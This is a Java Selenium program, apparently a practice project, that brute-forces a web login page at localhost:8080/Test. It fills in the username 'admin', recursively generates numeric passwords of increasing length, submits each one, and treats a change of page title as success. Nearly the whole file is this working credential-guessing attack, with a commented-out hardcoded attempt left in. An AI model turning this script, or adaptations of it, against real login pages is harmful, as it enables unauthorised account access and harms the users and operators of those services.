package selenium.bruteForceAttack.Test;

import java.util.NoSuchElementException;
import org.openqa.selenium.By;
import org.openqa.selenium.WebDriver;
import org.openqa.selenium.firefox.FirefoxDriver;

public class TestProject {
	static char[] alphabet = "0123456789".toCharArray();//"0123456789abcdefghijklmnopqrstuvwxyz".toCharArray();
	static String status= "none";
	static int iterationNum =0;
	static WebDriver driver = new FirefoxDriver();
	public static void main(String[] args) {	 
		
		 StringBuilder sb = new StringBuilder();
		int length = 0;
		 
		//Open page
//		WebDriver driver = new FirefoxDriver();

		//Go to project url
		driver.get("localhost:8080/Test");


		if(driver.getTitle().toString().equalsIgnoreCase("Login")){

			while(status.equalsIgnoreCase("Failed") || status.equalsIgnoreCase("none")){
				
				
				sb.setLength(length++);
				try {
				generate(sb, 0);
				} catch(NoSuchElementException e) {
					e.printStackTrace();
				}
				System.out.println(iterationNum);
				
//				//Find username field
//				driver.findElement(By.name("username")).clear(); //Clears username field of any existing text
//				driver.findElement(By.name("username")).sendKeys("admin"); // Enters a username string
//
//				//Find password field
//				driver.findElement(By.name("password")).clear(); // clears password field
//				driver.findElement(By.name("password")).sendKeys("1234"); // Enters a password field
//
//				// Finds and clicks on login button
//				driver.findElement(By.id("loginButton")).click();
//
//				if(driver.getTitle().toString().equalsIgnoreCase("Login"))
//					status = "Failed";
//				else {
//					status = "Success";
//					driver.get("https://www.youtube.com/watch?v=Jmd4OLzhQw0"); // Will take o this web page if login was a succes
//				}
			}
		}

		
		System.out.println("\n\nDone -- "+sb.toString()  + status);
	}
	
	
	public static void generate(StringBuilder sb, int n) {
       
		try {
		//Find username field
		driver.findElement(By.name("username")).clear(); //Clears username field of any existing text
		driver.findElement(By.name("username")).sendKeys("admin"); // Enters a username string

		//Find password field
		driver.findElement(By.name("password")).clear(); // clears password field
		driver.findElement(By.name("password")).sendKeys(sb.toString()); // Enters a password field

		// Finds and clicks on login button
		driver.findElement(By.id("loginButton")).click();

		if(driver.getTitle().toString().equalsIgnoreCase("Login"))
			status = "Failed";
		else {
			status = "Success";
			driver.get("https://www.youtube.com/watch?v=Jmd4OLzhQw0"); // Will take o this web page if login was a succes
		}
		iterationNum++;
		} catch (Exception e) {
			e.printStackTrace();
			return ;
		}
		if(status.equalsIgnoreCase("Success") || n == sb.length())
			return;
	
        for (char letter : alphabet) {
            sb.setCharAt(n, letter);
            generate(sb, n+1);
        }
    }

}
